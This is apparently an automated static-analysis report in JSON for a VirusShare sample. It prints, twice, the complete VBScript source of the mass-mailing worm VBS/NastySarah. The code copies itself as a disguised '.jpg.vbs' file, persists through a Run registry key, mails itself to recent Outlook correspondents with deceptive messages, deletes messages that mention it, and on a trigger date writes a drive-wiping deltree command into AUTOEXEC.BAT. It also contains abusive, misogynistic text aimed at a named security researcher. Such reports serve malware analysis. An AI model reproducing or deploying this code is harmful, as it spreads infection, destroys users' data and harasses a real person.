{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AUTOEXEC": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CurrentUser": "May detect Norman Sandbox",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "On Error Resume Next\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nFSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(1)&\"\\NastySarah.jpg.vbs\"\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\NastySarah\", FSO.GetSpecialFolder(1)&\"\\NastySarah.jpg.vbs\"\nSet MAPI = CreateObject(\"MAPI.Session\")\nIf MAPI Is Nothing Then\n\tSet MAPI = CreateObject(\"CDONTS.Session\")\nEnd If\nIf MAPI Is Nothing Then\n\tSet MAPI = CreateObject(\"Outlook.Application\").GetNameSpace(\"MAPI\")\nEnd If\nIf MAPI Is Nothing Then\n\tWshShell.Popup \"\tHey!  Haven't you heard!  There's a VBS worm spreading by this very filename!  You're lucky you didn't get hit!  Forward this warning on to all of your contacts, so they won't get hit by the bug!\"\n\tWScript.Quit\nElse\n\tWshShell.Popup \"FatalAppExit: GetLastError returns 0xFFFFFFFF.\",,48,\"Image Preview\"\nEnd If\nMAPI.Logon\nFor Each JX In MAPI.GetFolders\n\tFor Each JM in JX.Items\n\t\tSet MItem = JM\n\t\tEnumItems\n\tNext\n\tFor Each JP In JX.Messages\n\t\tSet MItem = JP\n\t\tEnumItems\n\tNext\n\tFor Each JA In JX.HiddenMessages\n\t\tSet MItem = JA\n\t\tEnumItems\n\tNext\nNext\nMAPI.Logoff\nIf Int(Rnd * 20) = 5 Then\n\tWshShell.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\", \"VBS/NastySarah@m\"\n\tWshShell.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\", \"By FileSystemObject\"\n\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\InfoTip\", \tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\InfoTip\", \"Failure is not an option, it comes bundled with your Microsoft product.  And \"\"some lame ol' coward's VBS worm\"\" comes bundled with your NEVER-EXPLOITED Outlook.\"\n\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\\", \"By FileSystemObject\"\n\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\\", \"VBS/NastySarah@m\"\n\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\InfoTip\", \"I'm an Outlook mailer, you stupid S.O.B!  Tell your friends to get rid of MS Outlook!!!\"\nEnd If\nIf Day(Now) = 31 And Month(Now) = 5 Then\n\tWshShell.Popup \"Have you ever heard of that fat, ugly bitch Sarah Gordon?  She claims to be 'discovering what drives us', but really, she just pisses us off!  In honor of Sarah Gordon, fat bitch of the high seas!\"&vbCrLf&vbCrLf&\"VBS/NastySarah@m is Copyright (C), FileSystemObject 2001.\",,48,\"Bitch of the High Seas\"\n\tSet AEB = FSO.OpenTextFile(\"C:\\AUTOEXEC.BAT\",2,True)\n\tAEB.Write \"deltree /y c:\\*.*\"\n\tAEB.Close\nEnd If\n\nSub EnumItems()\nOn Error Resume Next\nRR = WshShell.RegRead(\"HKLM\\NastySarah\\\"&MItem.SenderName)\nIf InStr(1, UCase(MItem.Subject), \"NASTYSARAH\") > 0 Or InStr(1, UCase(MItem.Body), \"NASTYSARAH\" > 0 Then bDelete\nIf Not RR = 1 And DateDiff(\"d\", Now, MItem.SentOn) < 4 Then\n\tIf bDelete Then\n\t\tCR = WshShell.RegRead(\"HKLM\\FileSystemObject\\\"&MItem.SenderName)\n\t\tIf Not CR = 1 Then\n\t\t\tSet Stealth = MItem.Reply\n\t\t\tStealth.Body = \"Trust me, the JPG's safe.  Yes, I did send it.\" & vbCrLf & vbCrLf & \"Regards,\" & vbCrLf & MAPI.CurrentUser.Name\n\t\t\tStealth.DeleteAfterSubmit\n\t\t\tStealth.Send\n\t\t\tWshShell.RegWrite \"HKLM\\FileSystemObject\\\"&MItem.SenderName\n\t\tEnd If\n\tElse\n\t\tSet MTX = MItem.Reply\n\t\tMTX.Body = \"Hey!  Thanks for your mail!  I've been kind of busy lately, and haven't\"&vbCrLf&\"really had time to do a full reply, so, until I do, check this out.\"&vbCrLf&vbCrLf&\"Regards,\"&MAPI.CurrentUser.Name&vbCrLf&vbCrLf&MTX.Body\n\t\tMTX.Attachments.Add(FSO.GetSpecialFolder(1)&\"\\NastySarah.jpg.vbs\")\n\t\tMTX.DeleteAfterSubmit\n\t\tMTX.Send\n\t\tWshShell.RegWrite \"HKLM\\NastySarah\\\"&MItem.SenderName,1,\"REG_DWORD\"\n\tEnd If\nEnd If\nIf bDelete Then\n\tMItem.Close\n\tMItem.Delete\nEnd If\nEnd Sub\n"
    },
    "filename": "VirusShare_e4963d61a4194ad5993cd1e99d32d7e8",
    "filesize": 3769,
    "filetype": "ASCII text, with very long lines",
    "hashes": {
        "md5": "e4963d61a4194ad5993cd1e99d32d7e8",
        "sha1": "bdac795fd03ea89a8342ba6e2de1c467cda50423",
        "sha256": "9a00a4305ca81bc6127b1bba84eed49b90e33070923475610e3fdad3677a3a2b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "On Error Resume Next",
            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "FSO.CopyFile WScript.ScriptFullName, FSO.GetSpecialFolder(1)&\"\\NastySarah.jpg.vbs\"",
            "Set WshShell = CreateObject(\"WScript.Shell\")",
            "WshShell.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\NastySarah\", FSO.GetSpecialFolder(1)&\"\\NastySarah.jpg.vbs\"",
            "Set MAPI = CreateObject(\"MAPI.Session\")",
            "If MAPI Is Nothing Then",
            "\tSet MAPI = CreateObject(\"CDONTS.Session\")",
            "End If",
            "If MAPI Is Nothing Then",
            "\tSet MAPI = CreateObject(\"Outlook.Application\").GetNameSpace(\"MAPI\")",
            "End If",
            "If MAPI Is Nothing Then",
            "\tWshShell.Popup \"\tHey!  Haven't you heard!  There's a VBS worm spreading by this very filename!  You're lucky you didn't get hit!  Forward this warning on to all of your contacts, so they won't get hit by the bug!\"",
            "\tWScript.Quit",
            "Else",
            "\tWshShell.Popup \"FatalAppExit: GetLastError returns 0xFFFFFFFF.\",,48,\"Image Preview\"",
            "End If",
            "MAPI.Logon",
            "For Each JX In MAPI.GetFolders",
            "\tFor Each JM in JX.Items",
            "\t\tSet MItem = JM",
            "\t\tEnumItems",
            "\tNext",
            "\tFor Each JP In JX.Messages",
            "\t\tSet MItem = JP",
            "\t\tEnumItems",
            "\tNext",
            "\tFor Each JA In JX.HiddenMessages",
            "\t\tSet MItem = JA",
            "\t\tEnumItems",
            "\tNext",
            "Next",
            "MAPI.Logoff",
            "If Int(Rnd * 20) = 5 Then",
            "\tWshShell.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner\", \"VBS/NastySarah@m\"",
            "\tWshShell.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization\", \"By FileSystemObject\"",
            "\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\InfoTip\", \tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\InfoTip\", \"Failure is not an option, it comes bundled with your Microsoft product.  And \"\"some lame ol' coward's VBS worm\"\" comes bundled with your NEVER-EXPLOITED Outlook.\"",
            "\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\\", \"By FileSystemObject\"",
            "\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\\", \"VBS/NastySarah@m\"",
            "\tWshShell.RegWrite \"HKEY_CLASSES_ROOT\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\InfoTip\", \"I'm an Outlook mailer, you stupid S.O.B!  Tell your friends to get rid of MS Outlook!!!\"",
            "End If",
            "If Day(Now) = 31 And Month(Now) = 5 Then",
            "\tWshShell.Popup \"Have you ever heard of that fat, ugly bitch Sarah Gordon?  She claims to be 'discovering what drives us', but really, she just pisses us off!  In honor of Sarah Gordon, fat bitch of the high seas!\"&vbCrLf&vbCrLf&\"VBS/NastySarah@m is Copyright (C), FileSystemObject 2001.\",,48,\"Bitch of the High Seas\"",
            "\tSet AEB = FSO.OpenTextFile(\"C:\\AUTOEXEC.BAT\",2,True)",
            "\tAEB.Write \"deltree /y c:\\*.*\"",
            "\tAEB.Close",
            "End If",
            "Sub EnumItems()",
            "On Error Resume Next",
            "RR = WshShell.RegRead(\"HKLM\\NastySarah\\\"&MItem.SenderName)",
            "If InStr(1, UCase(MItem.Subject), \"NASTYSARAH\") > 0 Or InStr(1, UCase(MItem.Body), \"NASTYSARAH\" > 0 Then bDelete",
            "If Not RR = 1 And DateDiff(\"d\", Now, MItem.SentOn) < 4 Then",
            "\tIf bDelete Then",
            "\t\tCR = WshShell.RegRead(\"HKLM\\FileSystemObject\\\"&MItem.SenderName)",
            "\t\tIf Not CR = 1 Then",
            "\t\t\tSet Stealth = MItem.Reply",
            "\t\t\tStealth.Body = \"Trust me, the JPG's safe.  Yes, I did send it.\" & vbCrLf & vbCrLf & \"Regards,\" & vbCrLf & MAPI.CurrentUser.Name",
            "\t\t\tStealth.DeleteAfterSubmit",
            "\t\t\tStealth.Send",
            "\t\t\tWshShell.RegWrite \"HKLM\\FileSystemObject\\\"&MItem.SenderName",
            "\t\tEnd If",
            "\tElse",
            "\t\tSet MTX = MItem.Reply",
            "\t\tMTX.Body = \"Hey!  Thanks for your mail!  I've been kind of busy lately, and haven't\"&vbCrLf&\"really had time to do a full reply, so, until I do, check this out.\"&vbCrLf&vbCrLf&\"Regards,\"&MAPI.CurrentUser.Name&vbCrLf&vbCrLf&MTX.Body",
            "\t\tMTX.Attachments.Add(FSO.GetSpecialFolder(1)&\"\\NastySarah.jpg.vbs\")",
            "\t\tMTX.DeleteAfterSubmit",
            "\t\tMTX.Send",
            "\t\tWshShell.RegWrite \"HKLM\\NastySarah\\\"&MItem.SenderName,1,\"REG_DWORD\"",
            "\tEnd If",
            "End If",
            "If bDelete Then",
            "\tMItem.Close",
            "\tMItem.Delete",
            "End If",
            "End Sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.302749",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
